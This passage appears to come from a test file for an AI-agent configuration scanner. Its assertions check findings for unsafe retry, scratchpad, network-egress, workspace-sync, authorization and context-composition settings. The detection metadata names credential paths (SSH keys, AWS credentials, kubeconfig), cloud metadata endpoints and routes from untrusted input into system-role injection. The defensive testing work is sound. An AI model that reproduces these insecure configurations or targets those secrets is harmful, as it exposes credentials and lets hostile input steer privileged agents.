      agent_tool_retry_privileged_tool_authority: true,
      agent_tool_retry_non_idempotent_actions: true,
      agent_tool_retry_idempotency_disabled: true,
      agent_tool_retry_approval_required: false
    });
    expect(runtimeToolRetryFindings[0]?.matched_object.metadata.agent_tool_retry_action_categories).toEqual([
      "database_write",
      "external_response",
      "secret_manager_access",
      "tool_call"
    ]);
    expect(runtimeToolRetryFindings[0]?.severity).toBe("critical");
    expect(runtimeToolRetryFindings[0]?.confidence).toBe("very_high");
    expect(runtimeToolRetryFindings[0]?.recommended_control).toBe("require_approval");
    expect(JSON.stringify(runtimeToolRetryFindings[0])).not.toContain("${TOOL_RETRY_POLICY_TOKEN}");
    expect(JSON.stringify(runtimeToolRetryFindings[0])).not.toContain("support_db.update_customer_record");
    expect(JSON.stringify(runtimeToolRetryFindings[0])).not.toContain("slack.post_customer_reply");
    expect(JSON.stringify(runtimeToolRetryFindings[0])).not.toContain("vault_secret_lookup.read_support_token");
    expect(JSON.stringify(runtimeToolRetryFindings[0])).not.toContain("untrusted_customer_ticket");
    expect(JSON.stringify(runtimeToolRetryFindings[0])).not.toContain("browser_tool_output");
    expect(JSON.stringify(runtimeToolRetryFindings[0])).not.toContain("retrieved_customer_context");
    expect(JSON.stringify(runtimeToolRetryFindings[0])).not.toContain("retry_customer_email");
    const runtimeToolRetryModelSelectedReplayFindings = findings.filter(
      (finding) => finding.rule_id === "AGENTCSP-RUNTIME-101"
    );
    expect(runtimeToolRetryModelSelectedReplayFindings).toHaveLength(1);
    expect(runtimeToolRetryModelSelectedReplayFindings[0]?.matched_object.path).toBe("tool-retry/retry-policy.yaml");
    expect(runtimeToolRetryModelSelectedReplayFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_tool_retry_policy_config: true,
      agent_tool_retry_enabled: true,
      agent_tool_retry_automatic_retry: true,
      agent_tool_retry_replay_enabled: true,
      agent_tool_retry_retry_on_failure: true,
      agent_tool_retry_retry_on_timeout: true,
      agent_tool_retry_retry_on_rate_limit: true,
      agent_tool_retry_retry_on_validation_error: true,
      agent_tool_retry_max_attempts_gt_one: true,
      agent_tool_retry_backoff_disabled: true,
      agent_tool_retry_idempotency_disabled: true,
      agent_tool_retry_deduplication_disabled: true,
      agent_tool_retry_exactly_once_disabled: true,
      agent_tool_retry_non_idempotent_actions: true,
      agent_tool_retry_untrusted_input: true,
      agent_tool_retry_tool_output_replay: true,
      agent_tool_retry_model_selected_retry: true,
      agent_tool_retry_write_authority: true,
      agent_tool_retry_external_authority: true,
      agent_tool_retry_secret_context: true,
      agent_tool_retry_sensitive_context: true,
      agent_tool_retry_pii_context: true,
      agent_tool_retry_approval_required: false
    });
    expect(
      runtimeToolRetryModelSelectedReplayFindings[0]?.matched_object.metadata.agent_tool_retry_action_categories
    ).toEqual(["database_write", "external_response", "secret_manager_access", "tool_call"]);
    expect(runtimeToolRetryModelSelectedReplayFindings[0]?.matched_object.data_classes).toContain("credential");
    expect(runtimeToolRetryModelSelectedReplayFindings[0]?.matched_object.secret_exposure).toBe(true);
    expect(runtimeToolRetryModelSelectedReplayFindings[0]?.matched_object.untrusted_to_privileged).toBe(true);
    expect(runtimeToolRetryModelSelectedReplayFindings[0]?.severity).toBe("critical");
    expect(runtimeToolRetryModelSelectedReplayFindings[0]?.confidence).toBe("very_high");
    expect(runtimeToolRetryModelSelectedReplayFindings[0]?.recommended_control).toBe("quarantine");
    expect(JSON.stringify(runtimeToolRetryModelSelectedReplayFindings[0])).not.toContain("${TOOL_RETRY_POLICY_TOKEN}");
    expect(JSON.stringify(runtimeToolRetryModelSelectedReplayFindings[0])).not.toContain(
      "support_db.update_customer_record"
    );
    expect(JSON.stringify(runtimeToolRetryModelSelectedReplayFindings[0])).not.toContain("slack.post_customer_reply");
    expect(JSON.stringify(runtimeToolRetryModelSelectedReplayFindings[0])).not.toContain(
      "vault_secret_lookup.read_support_token"
    );
    expect(JSON.stringify(runtimeToolRetryModelSelectedReplayFindings[0])).not.toContain("untrusted_customer_ticket");
    expect(JSON.stringify(runtimeToolRetryModelSelectedReplayFindings[0])).not.toContain("browser_tool_output");
    expect(JSON.stringify(runtimeToolRetryModelSelectedReplayFindings[0])).not.toContain("retrieved_customer_context");
    expect(JSON.stringify(runtimeToolRetryModelSelectedReplayFindings[0])).not.toContain("retry_customer_email");
    expect(JSON.stringify(runtimeToolRetryModelSelectedReplayFindings[0])).not.toContain("retry_account_number");
    expect(JSON.stringify(runtimeToolRetryModelSelectedReplayFindings[0])).not.toContain("confidential_retry_notes");
    const runtimeReasoningStateFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-057");
    expect(runtimeReasoningStateFindings).toHaveLength(1);
    expect(runtimeReasoningStateFindings[0]?.matched_object.path).toBe("reasoning/scratchpad-policy.yaml");
    expect(runtimeReasoningStateFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_reasoning_state_config: true,
      agent_reasoning_state_enabled: true,
      agent_reasoning_state_capture_enabled: true,
      agent_reasoning_state_remote: true,
      agent_reasoning_state_persistent: true,
      agent_reasoning_state_replay_enabled: true,
      agent_reasoning_state_planner_uses_state: true,
      agent_reasoning_state_untrusted_input: true,
      agent_reasoning_state_sensitive_capture: true,
      agent_reasoning_state_redaction_disabled: true,
      agent_reasoning_state_access_control_disabled: true,
      agent_reasoning_state_approval_required: false
    });
    expect(runtimeReasoningStateFindings[0]?.matched_object.metadata.agent_reasoning_state_capture_categories).toEqual([
      "memory_context",
      "plan_context",
      "prompt_context",
      "reasoning_trace",
      "retrieval_context",
      "secret_material",
      "tool_observation"
    ]);
    expect(runtimeReasoningStateFindings[0]?.severity).toBe("critical");
    expect(runtimeReasoningStateFindings[0]?.confidence).toBe("very_high");
    expect(runtimeReasoningStateFindings[0]?.recommended_control).toBe("redact");
    expect(JSON.stringify(runtimeReasoningStateFindings[0])).not.toContain("${REASONING_STATE_TOKEN}");
    expect(JSON.stringify(runtimeReasoningStateFindings[0])).not.toContain("scratchpad.agentcsp-demo.example.invalid");
    expect(JSON.stringify(runtimeReasoningStateFindings[0])).not.toContain("customer-support-reasoning");
    expect(JSON.stringify(runtimeReasoningStateFindings[0])).not.toContain("scratchpad_customer_email");
    expect(JSON.stringify(runtimeReasoningStateFindings[0])).not.toContain("scratchpad_account_number");
    expect(JSON.stringify(runtimeReasoningStateFindings[0])).not.toContain("confidential_reasoning_notes");
    expect(JSON.stringify(runtimeReasoningStateFindings[0])).not.toContain("untrusted_customer_ticket");
    const runtimeReasoningStatePublicFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-070");
    expect(runtimeReasoningStatePublicFindings).toHaveLength(1);
    expect(runtimeReasoningStatePublicFindings[0]?.matched_object.path).toBe("reasoning/scratchpad-policy.yaml");
    expect(runtimeReasoningStatePublicFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_reasoning_state_config: true,
      agent_reasoning_state_capture_enabled: true,
      agent_reasoning_state_remote: true,
      agent_reasoning_state_shared: true,
      agent_reasoning_state_public_access: true,
      agent_reasoning_state_redaction_disabled: true,
      agent_reasoning_state_access_control_disabled: true,
      agent_reasoning_state_approval_required: false
    });
    expect(runtimeReasoningStatePublicFindings[0]?.matched_object.metadata.agent_reasoning_state_capture_categories).toEqual([
      "memory_context",
      "plan_context",
      "prompt_context",
      "reasoning_trace",
      "retrieval_context",
      "secret_material",
      "tool_observation"
    ]);
    expect(runtimeReasoningStatePublicFindings[0]?.severity).toBe("critical");
    expect(runtimeReasoningStatePublicFindings[0]?.confidence).toBe("very_high");
    expect(runtimeReasoningStatePublicFindings[0]?.recommended_control).toBe("redact");
    expect(JSON.stringify(runtimeReasoningStatePublicFindings[0])).not.toContain("${REASONING_STATE_TOKEN}");
    expect(JSON.stringify(runtimeReasoningStatePublicFindings[0])).not.toContain("scratchpad.agentcsp-demo.example.invalid");
    expect(JSON.stringify(runtimeReasoningStatePublicFindings[0])).not.toContain("customer-support-reasoning");
    expect(JSON.stringify(runtimeReasoningStatePublicFindings[0])).not.toContain("scratchpad_customer_email");
    expect(JSON.stringify(runtimeReasoningStatePublicFindings[0])).not.toContain("scratchpad_account_number");
    expect(JSON.stringify(runtimeReasoningStatePublicFindings[0])).not.toContain("confidential_reasoning_notes");
    const runtimeReasoningStateReplayFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-113");
    expect(runtimeReasoningStateReplayFindings).toHaveLength(1);
    expect(runtimeReasoningStateReplayFindings[0]?.matched_object.path).toBe("reasoning/scratchpad-policy.yaml");
    expect(runtimeReasoningStateReplayFindings[0]?.matched_object.data_classes).toEqual([
      "confidential",
      "credential",
      "pii",
      "secret"
    ]);
    expect(runtimeReasoningStateReplayFindings[0]?.matched_object.actions).toEqual([
      "call",
      "publish",
      "read",
      "remember",
      "send",
      "write"
    ]);
    expect(runtimeReasoningStateReplayFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_reasoning_state_config: true,
      agent_reasoning_state_enabled: true,
      agent_reasoning_state_capture_enabled: true,
      agent_reasoning_state_untrusted_input: true,
      agent_reasoning_state_remote: true,
      agent_reasoning_state_shared: true,
      agent_reasoning_state_public_access: true,
      agent_reasoning_state_replay_enabled: true,
      agent_reasoning_state_planner_uses_state: true,
      agent_reasoning_state_system_prompt_injection: true,
      agent_reasoning_state_secret_capture: true,
      agent_reasoning_state_pii_capture: true,
      agent_reasoning_state_redaction_disabled: true,
      agent_reasoning_state_access_control_disabled: true,
      agent_reasoning_state_approval_required: false
    });
    expect(runtimeReasoningStateReplayFindings[0]?.matched_object.metadata.agent_reasoning_state_capture_categories).toEqual([
      "memory_context",
      "plan_context",
      "prompt_context",
      "reasoning_trace",
      "retrieval_context",
      "secret_material",
      "tool_observation"
    ]);
    expect(runtimeReasoningStateReplayFindings[0]?.severity).toBe("critical");
    expect(runtimeReasoningStateReplayFindings[0]?.confidence).toBe("very_high");
    expect(runtimeReasoningStateReplayFindings[0]?.recommended_control).toBe("quarantine");
    expect(JSON.stringify(runtimeReasoningStateReplayFindings[0])).not.toContain("${REASONING_STATE_TOKEN}");
    expect(JSON.stringify(runtimeReasoningStateReplayFindings[0])).not.toContain("scratchpad.agentcsp-demo.example.invalid");
    expect(JSON.stringify(runtimeReasoningStateReplayFindings[0])).not.toContain("customer-support-reasoning");
    expect(JSON.stringify(runtimeReasoningStateReplayFindings[0])).not.toContain("scratchpad_customer_email");
    expect(JSON.stringify(runtimeReasoningStateReplayFindings[0])).not.toContain("scratchpad_account_number");
    expect(JSON.stringify(runtimeReasoningStateReplayFindings[0])).not.toContain("confidential_reasoning_notes");
    expect(JSON.stringify(runtimeReasoningStateReplayFindings[0])).not.toContain("untrusted_customer_ticket");
    expect(JSON.stringify(runtimeReasoningStateReplayFindings[0])).not.toContain("browser_tool_output");
    expect(JSON.stringify(runtimeReasoningStateReplayFindings[0])).not.toContain("retrieved_customer_context");
    const runtimeNetworkEgressFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-058");
    expect(runtimeNetworkEgressFindings).toHaveLength(1);
    expect(runtimeNetworkEgressFindings[0]?.matched_object.path).toBe("network/egress-policy.yaml");
    expect(runtimeNetworkEgressFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_network_egress_config: true,
      agent_network_egress_enabled: true,
      agent_network_egress_web_tool_authority: true,
      agent_network_egress_untrusted_input: true,
      agent_network_egress_private_network_access: true,
      agent_network_egress_metadata_service_access: true,
      agent_network_egress_credential_forwarding: true,
      agent_network_egress_dns_rebinding_protection_disabled: true,
      agent_network_egress_approval_required: false
    });
    expect(runtimeNetworkEgressFindings[0]?.matched_object.metadata.agent_network_egress_destination_kinds).toEqual([
      "cloud_metadata_service",
      "http_destination",
      "localhost_or_cluster_service",
      "private_network_range",
      "wildcard_destination"
    ]);
    expect(runtimeNetworkEgressFindings[0]?.severity).toBe("critical");
    expect(runtimeNetworkEgressFindings[0]?.confidence).toBe("very_high");
    expect(runtimeNetworkEgressFindings[0]?.recommended_control).toBe("require_approval");
    expect(JSON.stringify(runtimeNetworkEgressFindings[0])).not.toContain("${NETWORK_EGRESS_TOKEN}");
    expect(JSON.stringify(runtimeNetworkEgressFindings[0])).not.toContain("169.254.169.254");
    expect(JSON.stringify(runtimeNetworkEgressFindings[0])).not.toContain("metadata.google.internal");
    expect(JSON.stringify(runtimeNetworkEgressFindings[0])).not.toContain("127.0.0.1");
    expect(JSON.stringify(runtimeNetworkEgressFindings[0])).not.toContain("admin.internal.local");
    expect(JSON.stringify(runtimeNetworkEgressFindings[0])).not.toContain("egress_metadata_token");
    expect(JSON.stringify(runtimeNetworkEgressFindings[0])).not.toContain("egress_customer_email");
    expect(JSON.stringify(runtimeNetworkEgressFindings[0])).not.toContain("confidential_internal_response");
    expect(JSON.stringify(runtimeNetworkEgressFindings[0])).not.toContain("untrusted_customer_ticket_url");
    const runtimeNetworkRedirectFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-074");
    expect(runtimeNetworkRedirectFindings).toHaveLength(1);
    expect(runtimeNetworkRedirectFindings[0]?.matched_object.path).toBe("network/egress-policy.yaml");
    expect(runtimeNetworkRedirectFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_network_egress_config: true,
      agent_network_egress_enabled: true,
      agent_network_egress_web_tool_authority: true,
      agent_network_egress_untrusted_input: true,
      agent_network_egress_user_controlled_url: true,
      agent_network_egress_wildcard_destination: true,
      agent_network_egress_redirects_allowed: true,
      agent_network_egress_dns_rebinding_protection_disabled: true,
      agent_network_egress_private_network_access: true,
      agent_network_egress_request_headers_forwarded: true,
      agent_network_egress_credential_forwarding: true,
      agent_network_egress_response_capture: true,
      agent_network_egress_sensitive_response_capture: true,
      agent_network_egress_approval_required: false
    });
    expect(runtimeNetworkRedirectFindings[0]?.matched_object.metadata.agent_network_egress_destination_kinds).toEqual([
      "cloud_metadata_service",
      "http_destination",
      "localhost_or_cluster_service",
      "private_network_range",
      "wildcard_destination"
    ]);
    expect(runtimeNetworkRedirectFindings[0]?.severity).toBe("critical");
    expect(runtimeNetworkRedirectFindings[0]?.confidence).toBe("very_high");
    expect(runtimeNetworkRedirectFindings[0]?.recommended_control).toBe("deny");
    expect(JSON.stringify(runtimeNetworkRedirectFindings[0])).not.toContain("${NETWORK_EGRESS_TOKEN}");
    expect(JSON.stringify(runtimeNetworkRedirectFindings[0])).not.toContain("169.254.169.254");
    expect(JSON.stringify(runtimeNetworkRedirectFindings[0])).not.toContain("metadata.google.internal");
    expect(JSON.stringify(runtimeNetworkRedirectFindings[0])).not.toContain("127.0.0.1");
    expect(JSON.stringify(runtimeNetworkRedirectFindings[0])).not.toContain("admin.internal.local");
    expect(JSON.stringify(runtimeNetworkRedirectFindings[0])).not.toContain("Authorization");
    expect(JSON.stringify(runtimeNetworkRedirectFindings[0])).not.toContain("X-API-Key");
    expect(JSON.stringify(runtimeNetworkRedirectFindings[0])).not.toContain("egress_metadata_token");
    expect(JSON.stringify(runtimeNetworkRedirectFindings[0])).not.toContain("egress_customer_email");
    expect(JSON.stringify(runtimeNetworkRedirectFindings[0])).not.toContain("confidential_internal_response");
    expect(JSON.stringify(runtimeNetworkRedirectFindings[0])).not.toContain("untrusted_customer_ticket_url");
    const runtimeWorkspaceContextFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-059");
    expect(runtimeWorkspaceContextFindings).toHaveLength(1);
    expect(runtimeWorkspaceContextFindings[0]?.matched_object.path).toBe("workspace-context/context-sync.yaml");
    expect(runtimeWorkspaceContextFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_workspace_context_config: true,
      agent_workspace_context_enabled: true,
      agent_workspace_context_auto_sync_enabled: true,
      agent_workspace_context_remote_sync: true,
      agent_workspace_context_sensitive_paths: true,
      agent_workspace_context_secret_path_exposure: true,
      agent_workspace_context_untrusted_input: true,
      agent_workspace_context_redaction_disabled: true,
      agent_workspace_context_approval_required: false
    });
    expect(runtimeWorkspaceContextFindings[0]?.matched_object.metadata.agent_workspace_context_source_categories).toEqual([
      "cloud_credential",
      "env_file",
      "git_history",
      "home_directory",
      "kubeconfig",
      "private_repo",
      "ssh_key",
      "untrusted_selector",
      "workspace_file"
    ]);
    expect(runtimeWorkspaceContextFindings[0]?.severity).toBe("critical");
    expect(runtimeWorkspaceContextFindings[0]?.confidence).toBe("very_high");
    expect(runtimeWorkspaceContextFindings[0]?.recommended_control).toBe("redact");
    expect(JSON.stringify(runtimeWorkspaceContextFindings[0])).not.toContain("${WORKSPACE_CONTEXT_TOKEN}");
    expect(JSON.stringify(runtimeWorkspaceContextFindings[0])).not.toContain("context-sync.agentcsp-demo.example.invalid");
    expect(JSON.stringify(runtimeWorkspaceContextFindings[0])).not.toContain("/workspace/customer_private_repo");
    expect(JSON.stringify(runtimeWorkspaceContextFindings[0])).not.toContain("/Users/support/.ssh/id_rsa");
    expect(JSON.stringify(runtimeWorkspaceContextFindings[0])).not.toContain("/Users/support/.aws/credentials");
    expect(JSON.stringify(runtimeWorkspaceContextFindings[0])).not.toContain("/Users/support/.kube/config");
    expect(JSON.stringify(runtimeWorkspaceContextFindings[0])).not.toContain("workspace_customer_email");
    expect(JSON.stringify(runtimeWorkspaceContextFindings[0])).not.toContain("workspace_account_number");
    expect(JSON.stringify(runtimeWorkspaceContextFindings[0])).not.toContain("confidential_repo_notes");
    const runtimeWorkspaceCredentialPersistenceFindings = findings.filter(
      (finding) => finding.rule_id === "AGENTCSP-RUNTIME-100"
    );
    expect(runtimeWorkspaceCredentialPersistenceFindings).toHaveLength(1);
    expect(runtimeWorkspaceCredentialPersistenceFindings[0]?.matched_object.path).toBe(
      "workspace-context/context-sync.yaml"
    );
    expect(runtimeWorkspaceCredentialPersistenceFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_workspace_context_config: true,
      agent_workspace_context_enabled: true,
      agent_workspace_context_auto_sync_enabled: true,
      agent_workspace_context_remote_sync: true,
      agent_workspace_context_prompt_context: true,
      agent_workspace_context_rag_indexing: true,
      agent_workspace_context_memory_persistence: true,
      agent_workspace_context_env_file_access: true,
      agent_workspace_context_ssh_key_access: true,
      agent_workspace_context_cloud_credential_access: true,
      agent_workspace_context_kubeconfig_access: true,
      agent_workspace_context_home_directory_access: true,
      agent_workspace_context_git_history_access: true,
      agent_workspace_context_untrusted_input: true,
      agent_workspace_context_redaction_disabled: true,
      agent_workspace_context_agentcspignore_bypassed: true,
      agent_workspace_context_approval_required: false
    });
    expect(
      runtimeWorkspaceCredentialPersistenceFindings[0]?.matched_object.metadata.agent_workspace_context_source_categories
    ).toEqual([
      "cloud_credential",
      "env_file",
      "git_history",
      "home_directory",
      "kubeconfig",
      "private_repo",
      "ssh_key",
      "untrusted_selector",
      "workspace_file"
    ]);
    expect(
      runtimeWorkspaceCredentialPersistenceFindings[0]?.matched_object.metadata
        .agent_workspace_context_destination_kinds
    ).toEqual([
      "http_destination",
      "memory_store",
      "prompt_context",
      "rag_index",
      "remote_context_index",
      "shared_workspace"
    ]);
    expect(runtimeWorkspaceCredentialPersistenceFindings[0]?.matched_object.data_classes).toContain("credential");
    expect(runtimeWorkspaceCredentialPersistenceFindings[0]?.matched_object.secret_exposure).toBe(true);
    expect(runtimeWorkspaceCredentialPersistenceFindings[0]?.matched_object.untrusted_to_privileged).toBe(true);
    expect(runtimeWorkspaceCredentialPersistenceFindings[0]?.severity).toBe("critical");
    expect(runtimeWorkspaceCredentialPersistenceFindings[0]?.confidence).toBe("very_high");
    expect(runtimeWorkspaceCredentialPersistenceFindings[0]?.recommended_control).toBe("quarantine");
    expect(JSON.stringify(runtimeWorkspaceCredentialPersistenceFindings[0])).not.toContain("${WORKSPACE_CONTEXT_TOKEN}");
    expect(JSON.stringify(runtimeWorkspaceCredentialPersistenceFindings[0])).not.toContain(
      "context-sync.agentcsp-demo.example.invalid"
    );
    expect(JSON.stringify(runtimeWorkspaceCredentialPersistenceFindings[0])).not.toContain("customer_private_repo");
    expect(JSON.stringify(runtimeWorkspaceCredentialPersistenceFindings[0])).not.toContain(
      "/workspace/customer_private_repo"
    );
    expect(JSON.stringify(runtimeWorkspaceCredentialPersistenceFindings[0])).not.toContain(
      "/Users/support/.ssh/id_rsa"
    );
    expect(JSON.stringify(runtimeWorkspaceCredentialPersistenceFindings[0])).not.toContain(
      "/Users/support/.aws/credentials"
    );
    expect(JSON.stringify(runtimeWorkspaceCredentialPersistenceFindings[0])).not.toContain(
      "/Users/support/.kube/config"
    );
    expect(JSON.stringify(runtimeWorkspaceCredentialPersistenceFindings[0])).not.toContain("workspace_customer_email");
    expect(JSON.stringify(runtimeWorkspaceCredentialPersistenceFindings[0])).not.toContain("workspace_account_number");
    expect(JSON.stringify(runtimeWorkspaceCredentialPersistenceFindings[0])).not.toContain("confidential_repo_notes");
    const runtimeAuthorizationBrokerFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-041");
    expect(runtimeAuthorizationBrokerFindings).toHaveLength(1);
    expect(runtimeAuthorizationBrokerFindings[0]?.matched_object.path).toBe("authz/tool-broker.yaml");
    expect(runtimeAuthorizationBrokerFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_authorization_broker_config: true,
      agent_authorization_remote: true,
      agent_authorization_dynamic_grants_enabled: true,
      agent_authorization_model_selected_scope: true,
      agent_authorization_untrusted_subject: true,
      agent_authorization_untrusted_resource: true,
      agent_authorization_default_allow: true,
      agent_authorization_fail_open: true,
      agent_authorization_default_allow_or_fail_open: true,
      agent_authorization_wildcard_tool_scope: true,
      agent_authorization_wildcard_resource_scope: true,
      agent_authorization_broad_scope: true,
      agent_authorization_privileged_tool_authority: true,
      agent_authorization_write_authority: true,
      agent_authorization_external_authority: true,
      agent_authorization_secret_authority: true,
      agent_authorization_audit_disabled: true,
      agent_authorization_grant_ttl_missing: true,
      agent_authorization_approval_required: false
    });
    expect(runtimeAuthorizationBrokerFindings[0]?.matched_object.metadata.agent_authorization_tool_authority_categories).toEqual([
      "browser_action",
      "database_access",
      "external_response",
      "secret_manager_access",
      "tool_call"
    ]);
    expect(runtimeAuthorizationBrokerFindings[0]?.severity).toBe("critical");
    expect(runtimeAuthorizationBrokerFindings[0]?.confidence).toBe("very_high");
    expect(runtimeAuthorizationBrokerFindings[0]?.recommended_control).toBe("require_approval");
    expect(JSON.stringify(runtimeAuthorizationBrokerFindings[0])).not.toContain("${AGENT_AUTHZ_BROKER_TOKEN}");
    expect(JSON.stringify(runtimeAuthorizationBrokerFindings[0])).not.toContain("authz-broker.agentcsp-demo.example.invalid");
    expect(JSON.stringify(runtimeAuthorizationBrokerFindings[0])).not.toContain("customer_ticket_message");
    expect(JSON.stringify(runtimeAuthorizationBrokerFindings[0])).not.toContain("support_db.write");
    expect(JSON.stringify(runtimeAuthorizationBrokerFindings[0])).not.toContain("authz_customer_email");
    const runtimeAuthorizationFailOpenFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-075");
    expect(runtimeAuthorizationFailOpenFindings).toHaveLength(1);
    expect(runtimeAuthorizationFailOpenFindings[0]?.matched_object.path).toBe("authz/tool-broker.yaml");
    expect(runtimeAuthorizationFailOpenFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_authorization_broker_config: true,
      agent_authorization_enabled: true,
      agent_authorization_dynamic_grants_enabled: true,
      agent_authorization_untrusted_subject: true,
      agent_authorization_untrusted_resource: true,
      agent_authorization_default_allow: true,
      agent_authorization_fail_open: true,
      agent_authorization_default_allow_or_fail_open: true,
      agent_authorization_wildcard_tool_scope: true,
      agent_authorization_wildcard_resource_scope: true,
      agent_authorization_grant_ttl_missing: true,
      agent_authorization_audit_disabled: true,
      agent_authorization_destructive_authority: true,
      agent_authorization_secret_authority: true,
      agent_authorization_approval_required: false
    });
    expect(runtimeAuthorizationFailOpenFindings[0]?.matched_object.metadata.agent_authorization_tool_authority_categories).toEqual([
      "browser_action",
      "database_access",
      "external_response",
      "secret_manager_access",
      "tool_call"
    ]);
    expect(runtimeAuthorizationFailOpenFindings[0]?.severity).toBe("critical");
    expect(runtimeAuthorizationFailOpenFindings[0]?.confidence).toBe("very_high");
    expect(runtimeAuthorizationFailOpenFindings[0]?.recommended_control).toBe("deny");
    expect(JSON.stringify(runtimeAuthorizationFailOpenFindings[0])).not.toContain("${AGENT_AUTHZ_BROKER_TOKEN}");
    expect(JSON.stringify(runtimeAuthorizationFailOpenFindings[0])).not.toContain("authz-broker.agentcsp-demo.example.invalid");
    expect(JSON.stringify(runtimeAuthorizationFailOpenFindings[0])).not.toContain("customer_ticket_message");
    expect(JSON.stringify(runtimeAuthorizationFailOpenFindings[0])).not.toContain("support_db.write");
    expect(JSON.stringify(runtimeAuthorizationFailOpenFindings[0])).not.toContain("tenant:*");
    expect(JSON.stringify(runtimeAuthorizationFailOpenFindings[0])).not.toContain("vault://support/*");
    expect(JSON.stringify(runtimeAuthorizationFailOpenFindings[0])).not.toContain("authz_customer_email");
    const runtimeAuthorizationModelSelectedBypassFindings = findings.filter(
      (finding) => finding.rule_id === "AGENTCSP-RUNTIME-115"
    );
    expect(runtimeAuthorizationModelSelectedBypassFindings).toHaveLength(1);
    expect(runtimeAuthorizationModelSelectedBypassFindings[0]?.matched_object.path).toBe("authz/tool-broker.yaml");
    expect(runtimeAuthorizationModelSelectedBypassFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_authorization_broker_config: true,
      agent_authorization_enabled: true,
      agent_authorization_remote: true,
      agent_authorization_dynamic_grants_enabled: true,
      agent_authorization_model_selected_scope: true,
      agent_authorization_untrusted_subject: true,
      agent_authorization_untrusted_resource: true,
      agent_authorization_default_allow_or_fail_open: true,
      agent_authorization_wildcard_tool_scope: true,
      agent_authorization_wildcard_resource_scope: true,
      agent_authorization_privileged_tool_authority: true,
      agent_authorization_write_authority: true,
      agent_authorization_secret_authority: true,
      agent_authorization_audit_disabled: true,
      agent_authorization_grant_ttl_missing: true,
      agent_authorization_approval_required: false
    });
    expect(
      runtimeAuthorizationModelSelectedBypassFindings[0]?.matched_object.metadata
        .agent_authorization_tool_authority_categories
    ).toEqual(["browser_action", "database_access", "external_response", "secret_manager_access", "tool_call"]);
    expect(runtimeAuthorizationModelSelectedBypassFindings[0]?.matched_object.data_classes).toEqual([
      "confidential",
      "credential",
      "pii"
    ]);
    expect(runtimeAuthorizationModelSelectedBypassFindings[0]?.matched_object.actions).toEqual([
      "approve",
      "call",
      "publish",
      "read",
      "send",
      "write"
    ]);
    expect(runtimeAuthorizationModelSelectedBypassFindings[0]?.severity).toBe("critical");
    expect(runtimeAuthorizationModelSelectedBypassFindings[0]?.confidence).toBe("very_high");
    expect(runtimeAuthorizationModelSelectedBypassFindings[0]?.recommended_control).toBe("deny");
    expect(JSON.stringify(runtimeAuthorizationModelSelectedBypassFindings[0])).not.toContain("${AGENT_AUTHZ_BROKER_TOKEN}");
    expect(JSON.stringify(runtimeAuthorizationModelSelectedBypassFindings[0])).not.toContain(
      "authz-broker.agentcsp-demo.example.invalid"
    );
    expect(JSON.stringify(runtimeAuthorizationModelSelectedBypassFindings[0])).not.toContain("llm_policy_model");
    expect(JSON.stringify(runtimeAuthorizationModelSelectedBypassFindings[0])).not.toContain("customer_ticket_message");
    expect(JSON.stringify(runtimeAuthorizationModelSelectedBypassFindings[0])).not.toContain("browser_tool_output");
    expect(JSON.stringify(runtimeAuthorizationModelSelectedBypassFindings[0])).not.toContain("retrieved_account_context");
    expect(JSON.stringify(runtimeAuthorizationModelSelectedBypassFindings[0])).not.toContain("support_db.write");
    expect(JSON.stringify(runtimeAuthorizationModelSelectedBypassFindings[0])).not.toContain("tenant:*");
    expect(JSON.stringify(runtimeAuthorizationModelSelectedBypassFindings[0])).not.toContain("customer:*");
    expect(JSON.stringify(runtimeAuthorizationModelSelectedBypassFindings[0])).not.toContain("vault://support/*");
    expect(JSON.stringify(runtimeAuthorizationModelSelectedBypassFindings[0])).not.toContain("authz_customer_email");
    expect(JSON.stringify(runtimeAuthorizationModelSelectedBypassFindings[0])).not.toContain("authz_account_number");
    expect(JSON.stringify(runtimeAuthorizationModelSelectedBypassFindings[0])).not.toContain("confidential_authz_context");
    const runtimeContextComposerFindings = findings.filter((finding) => finding.rule_id === "AGENTCSP-RUNTIME-022");
    expect(runtimeContextComposerFindings).toHaveLength(1);
    expect(runtimeContextComposerFindings[0]?.matched_object.path).toBe("context/system-context.yaml");
    expect(runtimeContextComposerFindings[0]?.matched_object.metadata).toMatchObject({
      parsed_agent_context_composer_config: true,
      agent_context_composer_untrusted_sources: true,
      agent_context_composer_privileged_role_injection: true,
      agent_context_composer_system_role: true,
      agent_context_composer_developer_role: true,
      agent_context_composer_sanitization_disabled: true,
      agent_context_composer_delimiter_disabled: true,
      agent_context_composer_privileged_tool_authority: true,
      agent_context_composer_approval_required: false
    });
    expect(runtimeContextComposerFindings[0]?.matched_object.metadata.agent_context_composer_tool_authority_categories).toEqual([
      "browser_action",
      "database_access",
      "external_response",
      "memory_write",
      "secret_manager_access",
      "tool_call"
    ]);
    expect(runtimeContextComposerFindings[0]?.severity).toBe("critical");
    expect(runtimeContextComposerFindings[0]?.confidence).toBe("very_high");
    expect(runtimeContextComposerFindings[0]?.recommended_control).toBe("quarantine");
    expect(JSON.stringify(runtimeContextComposerFindings[0])).not.toContain("${CONTEXT_COMPOSER_TOKEN}");
    expect(JSON.stringify(runtimeContextComposerFindings[0])).not.toContain("customer_ticket_message");
    expect(JSON.stringify(runtimeContextComposerFindings[0])).not.toContain("retrieved_account_context");
    expect(JSON.stringify(runtimeContextComposerFindings[0])).not.toContain("support_db.update_customer_record");
